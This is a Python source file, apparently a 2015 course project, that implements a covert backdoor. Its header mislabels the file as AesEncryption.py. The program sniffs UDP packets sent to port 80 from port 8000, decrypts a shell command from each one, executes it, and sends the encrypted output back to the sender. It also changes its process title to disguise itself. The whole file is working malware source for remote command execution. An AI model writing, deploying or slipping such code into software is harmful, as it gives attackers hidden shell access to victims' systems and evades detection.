##################################################################################
##  SOURCE FILE:    AesEncryption.py
##
##  AUTHOR:         Geoff Dabu
##
##  PROGRAM:        Backdoor program which receives commands, executes them and
##                  returns the output to the client. The process title is also
##                  changed to disguise itself.
##
##  FUNCTIONS:      executeShellCommand(string)
##					parsePacket(packet)
##                  main()
##
##  DATE:           October 17, 2015
##
##################################################################################
import sys, os, argparse, socket, subprocess, logging, time, subprocess, setproctitle
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
from AesEncryption import *

##################################################################################
##  FUNCTION
##
##  Name:           executeShellCommand
##  Parameters:     string - a shell command
##  Return Values:  string - the output of the shell command
##  Description:    executes a shell command and returns the output
##################################################################################
def executeShellCommand(command):

    output = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    outputString = "\nOUTPUT:\n" + output.stdout.read() + output.stderr.read()
    return outputString

##################################################################################
##  FUNCTION
##
##  Name:           parsePacket
##  Parameters:     packet - a packet which is passed in through sniff()
##  Return Values:  n/a
##  Description:    receives a packet, decrypts the payload for a command,
##                  runs the command, and sends back a packet with a decrypted
##                  output result.
##################################################################################
def parsePacket(receivedPacket):

    command = decrypt(receivedPacket['Raw'].load)
    print "Excuting: " + command
    output = executeShellCommand(command)
    print "Output: " + output

    returnPacket = IP(src=receivedPacket["IP"].dst, dst=receivedPacket["IP"].src)/UDP(dport=receivedPacket['UDP'].sport,sport=receivedPacket['UDP'].dport)/encrypt(output)
    time.sleep(0.5)

    print "Sending Packet: "
    print returnPacket.show
    send(returnPacket)

##################################################################################
##  FUNCTION
##
##  Name:           main
##  Parameters:     n/a
##  Return Values:  n/a
##  Description:    Changes the process name of this program, and listens for
##                  packets that are directed to specific ports.
##################################################################################
def main():

    setproctitle.setproctitle("notabackdoor.py")
    sniff(filter="udp and (dst port 80) and (src port 8000)", prn=parsePacket)

if __name__ == '__main__':
    main()
